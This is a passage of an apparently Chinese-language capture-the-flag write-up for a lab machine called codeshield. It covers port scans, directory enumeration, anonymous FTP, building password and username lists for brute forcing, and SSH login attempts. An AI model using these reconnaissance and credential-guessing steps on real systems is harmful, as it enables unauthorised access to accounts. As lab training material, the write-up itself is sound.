| oslJyh/ZCYCjgUKG1FoqSYPd5LXBNLqld38DdoiQpCoqezQXtabdHOY1Syqprope
| iVfG8NlOKXtTDcBOLkOVD/DuiMQvsX8Zbg7FdkQ5cDubqO1cHd47kK0wiNrLVeEK
| yxSEqTqsXnYPHTJkxkvbjJZB2ZBQXVnQkQM4Avm6OSD0K7Vglc/15wYXlYarGgMH
| sMDzpOY+uhmsu6CKsLufZaG4N8/vbQWw73yqDpZgwqBi6ZPnw3JLJ5PnyHPtojTS
| 1ZUy
|_-----END CERTIFICATE-----
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
|_ssl-date: TLS randomness does not represent time
993/tcp   open  imaps?        syn-ack
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Issuer: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-26T09:34:43
| Not valid after:  2033-08-23T09:34:43
| MD5:   04aa:3069:8114:4330:b40e:52bc:e802:f76c
| SHA-1: a8d3:37d7:c10b:ea04:a17a:6199:fd81:ec6a:c56c:bd88
| -----BEGIN CERTIFICATE-----
| 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
| 1ZUy
|_-----END CERTIFICATE-----
|_imap-capabilities: IDLE SASL-IR more have ID post-login listed AUTH=PLAIN ENABLE capabilities IMAP4rev1 Pre-login OK AUTH=LOGINA0001 LITERAL+ LOGIN-REFERRALS
|_ssl-date: TLS randomness does not represent time
995/tcp   open  pop3s?        syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Issuer: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-26T09:34:43
| Not valid after:  2033-08-23T09:34:43
| MD5:   04aa:3069:8114:4330:b40e:52bc:e802:f76c
| SHA-1: a8d3:37d7:c10b:ea04:a17a:6199:fd81:ec6a:c56c:bd88
| -----BEGIN CERTIFICATE-----
| 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
| 1ZUy
|_-----END CERTIFICATE-----
|_pop3-capabilities: TOP UIDL SASL(PLAIN LOGIN) USER RESP-CODES CAPA AUTH-RESP-CODE PIPELINING
2222/tcp  open  ssh           syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuHgUlIwWnDaiir2GGz0SZ364+nUeN06MhKR1Ahpj0qttOmTUXB45W9LOLALPxvRIWFsE7b04T5MK4kCvM4VwKai+n6ON4kEkAqImw8UDpviFSLn5+A19IkBkiDPUtm2G/DD+NTXj2w1TD2Pr1Wi6zY6tN3klkf6bkcszQ863BrGe5WHQhnNotc8+O5U8Fl01Fu46Pd6arpCpvaXgBL7h9eOcIHaTqComgbeDcrqmSiGM1RRzhh/er1WtfClT0bFjSCaDe5NpE0Oat92xzFuQ62c3Z5hqDfYLh6mkFGH062Lc4xkGS84q2GByWzvKgxXtAGDURdxGkpo0H9FAmuaKb
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKw9aldAVwBR4fxzLD1Dqr4iBFV11fNBaZ+8pX4f1HDbPEscd2BkHMsYxR17e0zpSttM6DSfKT+YbLu2lDHWHmg=
|   256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPXrs+Ma5M6viFKpjdt5NluM7u7W2jtKcyf4oe2UtFM+
3389/tcp  open  ms-wbt-server syn-ack xrdp
22222/tcp open  ssh           syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2a:49:28:84:25:99:62:e8:29:68:88:d6:36:be:8e:d6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMgmhyYVdTpcZBiKVuLSA2gn7UAxrhbSO7ycTn7usJq/3mcYdGYZacNcCv8qraxBcrdp2zITdCxstX2Fhy/EG5Q=
|   256 20:9f:5b:3f:52:eb:a9:60:27:39:3b:e7:d8:17:8d:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJdUVPSunKWnNtVeXr0fSi7Nvs2f/J7wQpoTfOEZVpcT
Service Info: Hosts: -mail.codeshield.hmv,  mail.codeshield.hmv; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```
┌──(kali💀kali)-[~/temp/codeshield]
└─$ sudo gobuster dir -u https://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -b 301,401,403,404 
[sudo] password for kali: 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.0.2.22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   301,401,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: error on running gobuster: unable to connect to https://10.0.2.22/: Get "https://10.0.2.22/": tls: failed to verify certificate: x509: cannot validate certificate for 10.0.2.22 because it doesn't contain any IP SANs

┌──(kali💀kali)-[~/temp/codeshield]
└─$ sudo gobuster dir -u https://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -b 301,401,403,404 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.0.2.22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   401,403,404,301
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 60375]
/contact.html         (Status: 200) [Size: 19386]
/about.html           (Status: 200) [Size: 27169]
/blog.html            (Status: 200) [Size: 37661]
/detail.html          (Status: 200) [Size: 36406]
/service.html         (Status: 200) [Size: 23979]
/feature.html         (Status: 200) [Size: 18200]
/team.html            (Status: 200) [Size: 23225]
/quote.html           (Status: 200) [Size: 18554]
/price.html           (Status: 200) [Size: 23856]
/robots.txt           (Status: 200) [Size: 26]
/LICENSE.txt          (Status: 200) [Size: 1422]
/testimonial.html     (Status: 200) [Size: 18531]
Progress: 139602 / 882244 (15.82%)
```

第一次报错是因为服务器使用的 TLS 证书未包含目标 IP 地址（如 `10.0.2.22`）作为 SAN，导致客户端无法验证证书有效性，在 Gobuster 命令中添加 `-k` 或 `--no-tls-validation` 参数，跳过 TLS 证书验证。

但是太慢了，且没发现啥东西，就换了一个再扫一下：

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ curl -k https://$IP/robots.txt
User-agent: *
Disallow: /
```

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ sudo dirsearch -u https://$IP 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/temp/codeshield/reports/https_10.0.2.22/_25-05-29_23-55-44.txt

Target: https://10.0.2.22/

[23:55:44] Starting: 
[23:55:45] 301 -  162B  - /js  ->  https://10.0.2.22/js/
[23:55:45] 403 -  548B  - /%2e%2e;/test
[23:55:57] 301 -  162B  - /.well-known/caldav  ->  https://10.0.2.22/SOGo/dav
[23:55:57] 301 -  162B  - /.well-known/carddav  ->  https://10.0.2.22/SOGo/dav
[23:56:03] 200 -   27KB - /about.html
[23:56:09] 403 -  548B  - /admin/.config
[23:56:24] 403 -  548B  - /admpar/.ftppass
[23:56:24] 403 -  548B  - /admrev/.ftppass
[23:56:32] 403 -  548B  - /bitrix/.settings
[23:56:32] 403 -  548B  - /bitrix/.settings.php
[23:56:32] 403 -  548B  - /bitrix/.settings.php.bak
[23:56:32] 403 -  548B  - /bitrix/.settings.bak
[23:56:40] 200 -   19KB - /contact.html
[23:56:42] 301 -  162B  - /css  ->  https://10.0.2.22/css/
[23:56:51] 403 -  548B  - /ext/.deps
[23:56:51] 200 -   34KB - /favicon.ico
[23:56:59] 301 -  162B  - /img  ->  https://10.0.2.22/img/
[23:57:03] 200 -    5KB - /iredadmin
[23:57:03] 403 -  548B  - /js/
[23:57:05] 403 -  548B  - /lib/
[23:57:05] 403 -  548B  - /lib/flex/uploader/.settings
[23:57:05] 403 -  548B  - /lib/flex/uploader/.flexProperties
[23:57:05] 301 -  162B  - /lib  ->  https://10.0.2.22/lib/
[23:57:05] 403 -  548B  - /lib/flex/varien/.actionScriptProperties
[23:57:05] 403 -  548B  - /lib/flex/varien/.project
[23:57:05] 403 -  548B  - /lib/flex/varien/.flexLibProperties
[23:57:05] 403 -  548B  - /lib/flex/uploader/.actionScriptProperties
[23:57:05] 403 -  548B  - /lib/flex/varien/.settings
[23:57:05] 403 -  548B  - /lib/flex/uploader/.project
[23:57:06] 200 -    1KB - /LICENSE.txt
[23:57:09] 200 -    5KB - /mail/
[23:57:09] 301 -  162B  - /mail  ->  https://10.0.2.22/mail/
[23:57:09] 403 -  548B  - /mailer/.env
[23:57:13] 502 -  552B  - /Microsoft-Server-ActiveSync/
[23:57:16] 401 -  574B  - /netdata/
[23:57:17] 303 -    0B  - /newsletter/  ->  https://10.0.2.22/iredadmin/newsletter
[23:57:32] 403 -  548B  - /resources/sass/.sass-cache/
[23:57:32] 403 -  548B  - /resources/.arch-internal-preview.css
[23:57:32] 200 -   26B  - /robots.txt
[23:57:42] 403 -  548B  - /status?full=true
[23:57:42] 403 -  548B  - /status
[23:57:49] 403 -  548B  - /twitter/.env

Task Completed
```

## 漏洞发现

### ftp服务探测

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ ftp $IP                                                                                                                                                             
Connected to 10.0.2.22.
220 (vsFTPd 3.0.5)
Name (10.0.2.22:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||51498|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
-rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
226 Directory send OK.
ftp> mget *
mget CodeShield_pitch_deck.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||57895|)
150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).
100% |************************************************************************************************************************************************|  2294 KiB    4.37 MiB/s    00:00 ETA
226 Transfer complete.
2349914 bytes received in 00:00 (4.35 MiB/s)
mget Information_Security_Policy.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56628|)
150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
100% |************************************************************************************************************************************************| 67520      672.40 KiB/s    00:00 ETA
226 Transfer complete.
67520 bytes received in 00:00 (658.94 KiB/s)
mget The_2023_weak_password_report.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||64848|)
150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
100% |************************************************************************************************************************************************|   221 KiB    2.46 MiB/s    00:00 ETA
226 Transfer complete.
226435 bytes received in 00:00 (2.40 MiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||24645|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
-rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
226 Directory send OK.
ftp> exit
221 Goodbye.
```

前面信息搜集到的几个pdf文件全都下载下来了，看一下有些啥：

- `CodeShield_pitch_deck.pdf`是一个ppt

- `Information_Security_Policy.pdf`是信息安全政策

- `2023 The_2023_weak_password_report.pdf`是一份弱密码报告

发现了一些有可能利用到的信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612543.png" alt="image-20250530100300186" style="zoom:50%;" />

发现了`Jessica Carlson`以及相关信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612544.png" alt="image-20250530100359795" style="zoom:50%;" />

存在域名解析，可以加一下：

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ sudo vim /etc/hosts

┌──(kali💀kali)-[~/temp/codeshield]
└─$ cat /etc/hosts | grep hmv                                                               
10.0.2.22       codeshield.hmv
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612545.png" alt="image-20250530101708792" style="zoom:50%;" />

添加一下到密码中，说不定后面需要爆破啥的：

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ cat pass                             
Xxxxxxxxx001
Password123!
Greatplace2work!
Diciembre@2017
Hairdresser1!
1qa2ws3ed4rf
XXXX12345678
Hairdresser1
Xxxxxxxxx002
Xxxxxxxxxx01
```

### web探测

发现靶机开启了`80`和`443`端口，显然是有web服务的，打开发现几处名单：

![image-20250530104335540](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612546.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612547.png" alt="image-20250530104703775" style="zoom:50%;" />

把名单记录一下：

```bash
Jessica Carlson
Mohammed Mansour
Xian Tan
Annabella Cocci
Thomas Mitchell
Patrick Early
Bob Watson
Jennifer Cruise
John Doe
Angelina Johnson
```

以及评论里提到了一个人`Kevin Vaidez`。

但是根据经验，一般都是姓或名作为账号，试一下；

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ awk '{for(i=1;i<=NF;i++) print $i}' user >> user

┌──(kali💀kali)-[~/temp/codeshield]
└─$ cat user | grep -v '^$'
Jessica Carlson
Mohammed Mansour
Xian Tan
Annabella Cocci
Thomas Mitchell
Patrick Early
Bob Watson
Jennifer Cruise
John Doe
Angelina Johnson
Jessica
Carlson
Mohammed
Mansour
Xian
Tan
Annabella
Cocci
Thomas
Mitchell
Patrick
Early
Bob
Watson
Jennifer
Cruise
John
Doe
Angelina
Johnson

┌──(kali💀kali)-[~/temp/codeshield]
└─$ cat user | tr 'A-Z' 'a-z' >> user

┌──(kali💀kali)-[~/temp/codeshield]
└─$ cat user                         
Jessica Carlson
Mohammed Mansour
Xian Tan
Annabella Cocci
Thomas Mitchell
Patrick Early
Bob Watson
Jennifer Cruise
John Doe
Angelina Johnson
Kevin Vaidez
Jessica
Carlson
Mohammed
Mansour
Xian
Tan
Annabella
Cocci
Thomas
Mitchell
Patrick
Early
Bob
Watson
Jennifer
Cruise
John
Doe
Angelina
Johnson
Kevin
Vaidez
jessica carlson
mohammed mansour
xian tan
annabella cocci
thomas mitchell
patrick early
bob watson
jennifer cruise
john doe
angelina johnson
kevin vaidez
jessica
carlson
mohammed
mansour
xian
tan
annabella
cocci
thomas
mitchell
patrick
early
bob
watson
jennifer
cruise
john
doe
angelina
johnson
kevin
vaidez
```

还发现了一个敏感目录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612548.png" alt="image-20250530135120877" style="zoom:50%;" />

存在一个登录界面。

### 爆破

尝试爆破一下，但是未果，看了别的师傅的wp，发现是使用了一个工具生成用户名，额，这一点的思路来源可能是因为前面的那个邮箱的用户名有些奇怪想到的。

~~~bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ git clone https://github.com/w0Tx/generate-ad-username.git
Cloning into 'generate-ad-username'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 14 (delta 3), reused 3 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (14/14), 4.44 KiB | 758.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.

┌──(kali💀kali)-[~/temp/codeshield]
└─$ cd generate-ad-username

┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ ls -la
total 24
drwxr-xr-x 3 kali kali 4096 May 30 01:40 .
drwxr-xr-x 4 kali kali 4096 May 30 01:40 ..
-rw-r--r-- 1 kali kali 1974 May 30 01:40 ADGenerator.py
drwxr-xr-x 8 kali kali 4096 May 30 01:40 .git
-rw-r--r-- 1 kali kali 1030 May 30 01:40 README.md
-rw-r--r-- 1 kali kali   75 May 30 01:40 test.txt

┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ cat README.md          
# Why ?

This script has been made for quick creation of usernames to use against AD when you only have the names and surnames for OSCP, Labs... 

It's not perfect, feel free to modify it.

Naming convention can be found there : [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html#recon-active-directory-no-credssessions](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html#recon-active-directory-no-credssessions)

```
NameSurname
Name.Surname
NamSur (3letters of each)
Nam.Sur
NSurname
N.Surname
SurnameName
Surname.Name
SurnameN
Surname.N
```

# How ?

Input names should be seperated by ','.

```
test,test2
test3,test4
```

Then : `python3 ADGenerator.py names.txt`

Example of output : 

```
metodijelizabeta
metodij-elizabeta
metodij.elizabeta
meteli
met-eli
met.eli
melizabeta
m-elizabeta
m.elizabeta
elizabetametodij
elizabeta-metodij
elizabeta.metodij
elimet
eli-met
eli.met
emetodij
e-metodij
e.metodij
elizabetam
elizabeta-m
elizabeta.m
```
        
~~~

这样的话，就要用回最原始的那个user了：

```text
Jessica Carlson
Mohammed Mansour
Xian Tan
Annabella Cocci
Thomas Mitchell
Patrick Early
Bob Watson
Jennifer Cruise
John Doe
Angelina Johnson
Kevin Vaidez
```

再修改一下：

```bash
┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ cat new_user | tr ' ' ',' > user

┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ cat user                        
Jessica,Carlson
Mohammed,Mansour
Xian,Tan
Annabella,Cocci
Thomas,Mitchell
Patrick,Early
Bob,Watson
Jennifer,Cruise
John,Doe
Angelina,Johnson
Kevin,Vaidez
```

然后就可以使用脚本了：

```bash
┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ python3 ADGenerator.py user > ../user

┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ cat ../user | head -n 10
jessicacarlson
jessica-carlson
jessica.carlson
jescar
jes-car
jes.car
jcarlson
j-carlson
j.carlson
carlsonjessica
```

尝试爆破即可，需要注意到主机上存在`22`和`22222`两个`ssh`端口，需要进行甄别：

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ ssh valdezk@$IP -p 22222
The authenticity of host '[10.0.2.22]:22222 ([10.0.2.22]:22222)' can't be established.
ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? 
Host key verification failed.
```

发现公钥不匹配，**临时禁用主机密钥验证（仅限内网测试）**

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ ssh -o StrictHostKeyChecking=no hgbe@10.0.2.22    
Warning: Permanently added '10.0.2.22' (ED25519) to the list of known hosts.
hgbe@10.0.2.22's password: 

                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/codeshield]
└─$ ssh -o StrictHostKeyChecking=no hgbe@10.0.2.22 -p 22222
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
